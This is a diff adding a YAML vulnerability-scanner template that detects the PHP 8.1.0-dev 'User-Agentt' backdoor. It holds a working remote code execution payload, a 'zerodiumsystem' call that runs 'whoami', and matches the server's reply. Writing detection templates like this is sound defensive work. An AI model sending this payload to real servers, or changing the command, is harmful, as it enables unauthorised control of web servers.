@@ -1,0 +1,29 @@
+id: php-user-agent-rce
+info:
+  name: PHP User-Agent Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    PHP 8.1.0-dev has a backdoor vulnerability allowing attackers to execute arbitrary code by sending a User-Agent header. This can lead to server privileges gain and full control over the web server.
+  reference:
+    - https://www.php.net/downloads
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce,php,backdoor
+variables:
+  cmd: "whoami"
+http:
+  - raw:
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agentt: zerodiumsystem("{{cmd}}");
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "www-data"
+      - type: status
+        status:
+          - 200
